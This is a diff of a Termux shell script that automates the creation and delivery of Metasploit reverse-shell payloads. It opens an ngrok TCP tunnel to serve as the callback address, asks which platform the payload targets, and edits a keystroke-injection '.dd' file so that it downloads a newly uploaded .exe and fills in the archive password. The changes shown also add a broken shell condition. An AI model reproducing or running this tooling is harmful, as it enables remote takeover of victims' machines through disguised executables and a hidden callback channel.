@@ -3,8 +3,16 @@ TEMPFILE=/data/data/com.termux/files/home/msf/temp/.temp_ip_ngrok-tcp.txt
 FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
 PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
 IP=$(cat $TEMPFILE | sed 's/\:.*//')
-RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)                          LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt                       ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"           TEMP="/data/data/com.termux/files/home/msf/temp"                                        ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"           DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"                      DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
-OLDLINK=$(cat ~/msf/temp/old_link.txt)                                                  NEWLINK=$(cat ~/msf/temp/new_link.txt)
+RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)
+LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt
+ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"
+TEMP="/data/data/com.termux/files/home/msf/temp"
+ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"
+DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"
+DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
+OLDLINK=$(cat ~/msf/temp/old_link.txt)
+NEWLINK=$(cat ~/msf/temp/new_link.txt)
+catngrok=$(cat $TEMPFILE)
 
 echo "\033[1;32m____    ____  ___       __  ___      ___      .__   __.  _______   __  
 \   \  /   / /   \     |  |/  /     /   \     |  \ |  | |       \ |  | 
@@ -37,13 +45,16 @@ if [ $ngrok_choice = "y" ]; then
 	echo "NGROK RANDOM SERVER TCP IS STARTING..."
 	ngrok tcp 5656 > /dev/null &
 fi
-if [ $ngrok_choice = "n" ]; then
-	~/msf/script/check_ngrok.sh
-fi
-sleep 4.5
 echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
 echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
-echo "\033[1;32m \nCreating the payload...\033[0m"
+if [ $catngrokserver = "\n" ] & [ $ngrok_choice = "n" ]; then
+	ngrok tcp 5656 > /dev/null &
+	~/msf/script/check_ngrok.sh
+else
+	continue
+fi
+sleep 4.5
+echo "\033[1;32m \nPayload Options:\033[0m"
 echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
 
 echo "\033[1;33m:::: WHICH PLATFORM YOU WANT THE PAYLOAD TO RUN ON?\033[0m"
@@ -105,7 +116,7 @@ else
 	rm /storage/emulated/0/utiles/payload.dd
 	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 	echo "::::The links have been changed"
-	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/SECRET/$password/")" > /storage/emulated/0/utiles/payload.dd
+	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/PASSX/$password/")" > /storage/emulated/0/utiles/payload.dd
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
